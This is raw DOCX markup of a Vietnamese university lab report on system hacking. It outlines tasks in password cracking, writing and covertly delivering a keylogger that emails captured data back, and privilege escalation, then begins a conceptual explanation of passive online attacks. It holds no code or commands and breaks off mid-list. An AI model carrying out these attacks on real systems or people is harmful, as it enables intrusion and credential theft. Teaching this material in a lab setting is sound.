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D877F9">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="14" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Báo cáo LAB: System Hacking (123456)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ECD6C4">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Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>1. Crack password (123): Crack password với 3 loại khác nhau: Passive online, Active online, Offline.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3703E207">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="122" w:beforeLines="41" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="14" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Lưu ý: 3 loại trên được thực hiện với các mục tiêu khác nhau, ex: Users of Windows, Linux, wifi, email,  websites (facebook…), tools khác nhau</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D372995">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="151" w:beforeLines="50" w:beforeAutospacing="0" w:after="151" w:afterLines="50" w:afterAutospacing="0" w:line="14" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>2. Keylogger (4): Codding một keylogger để ghi các thông tin quan trọng của hệ thống </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>mục tiêu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, sau đó dùng một </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>phương pháp truyền mã độc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> keylogger này qua máy nạn nhân và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>kích hoạt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. Kết quả các thông tin ghi được sẽ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> gửi tới SV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> qua 1 email cá nhân của SV (hoặc dùng một phương pháp truyền dữ liệu bất kỳ như chat, sms, ftp...).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D07FE5D">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="14" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>3. Escalating privileges (5): Thực hiện 1 tấn công leo thang chiếm quyền cao hơn (chiều dọc) hoặc quyền user khác (chiều ngang)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CE9CCA">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:shd w:val="clear" w:fill="FFFFFF"/>
        <w:spacing w:before="71" w:beforeLines="24" w:beforeAutospacing="0" w:after="151" w:afterLines="50" w:afterAutospacing="0" w:line="14" w:lineRule="atLeast"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="353E4E"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>4. Others (6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52961DB7">
      <w:pPr>
        <w:spacing w:beforeAutospacing="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Crack password (123)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40495464">
      <w:pPr>
        <w:bidi w:val="0"/>
        <w:spacing w:before="151" w:beforeLines="50" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PHẦN 1: PASSIVE ONLINE ATTACK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679A46CA">
      <w:pPr>
        <w:pStyle w:val="85"/>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after="0" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Segoe UI" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:caps w:val="0"/>
          <w:color w:val="0F1115"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">Khái niệm: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Tấn công Passive Online là hình thức tấn công bằng mật khẩu khi kẻ tấn công (hacker) sẽ sử dụng các kỹ thuật đánh hơi gói để phát hiện ra các lỗ hổng mạng và lần theo các mật khẩu trong cùng một hệ thống mạng. Một cuộc tấn công Passive Online bao gồm các phương pháp như sniffing (đánh hơi), man-in-the-middle (tấn công xen giữa) và replay attacks (tấn công dựa vào phản hồi).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20135FC9">
      <w:pPr>
        <w:pStyle w:val="85"/>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151" w:beforeLines="50" w:beforeAutospacing="0" w:after="122" w:afterLines="41" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Trước khi đăng nhập thành công, mật khẩu của người dùng sẽ được xác minh qua nhiều giai đoạn. Đầu tiên, mật khẩu bị bắt (capture) trong quá trình xác thực và sau đó nó có thể được so sánh với một từ điển (dictionary) hoặc là danh sách từ (word list). Tài khoản người dùng có mật khẩu thường được băm (hashed) hoặc mã hóa (encrypted) trước khi gửi lên mạng để ngăn chặn truy cập trái phép và sử dụng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB75716">
      <w:pPr>
        <w:pStyle w:val="85"/>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ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Nếu mật khẩu được bảo vệ bằng cách trên, các hacker có thể sử dụng một số công cụ đặc biệt để phá vỡ các thuật toán mã hóa mật khẩu và giành quyền truy cập vào mật khẩu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2231E27E">
      <w:pPr>
        <w:pStyle w:val="85"/>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after="0" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Các hình thức phổ biến cho các cuộc tấn công Passive Online như sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0627227C">
      <w:pPr>
        <w:pStyle w:val="85"/>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64" w:beforeLines="21" w:beforeAutospacing="0" w:after="79" w:afterLines="26" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="single" w:color="E5E7EB" w:sz="2" w:space="0"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>- Phân tích lưu lượng:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> Quan sát chuyển động của trang web và hoạt động truy cập của người dùng đối với từng trang web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4542857D">
      <w:pPr>
        <w:pStyle w:val="85"/>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firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="single" w:color="E5E7EB" w:sz="2" w:space="0"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>- Khai thác:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> Kiểm tra email, tin nhắn đã được giải mã.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E7FC69">
      <w:pPr>
        <w:pStyle w:val="85"/>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96" w:beforeLines="32" w:beforeAutospacing="0" w:after="79" w:afterLines="26" w:afterAutospacing="0"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="single" w:color="E5E7EB" w:sz="2" w:space="0"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>- Quét:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> Kiểm tra tiện ích (các cổng mở, khung bảo mật thấp) được liên kết với web để tìm các lỗ hổng bảo mật.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1893FEA8">
      <w:pPr>
        <w:pStyle w:val="85"/>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ind w:left="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="single" w:color="E5E7EB" w:sz="2" w:space="0"/>
          <w:shd w:val="clear" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>- Mã hóa:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="__Inter_Fallback_e68c2d" w:cs="Times New Roman"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
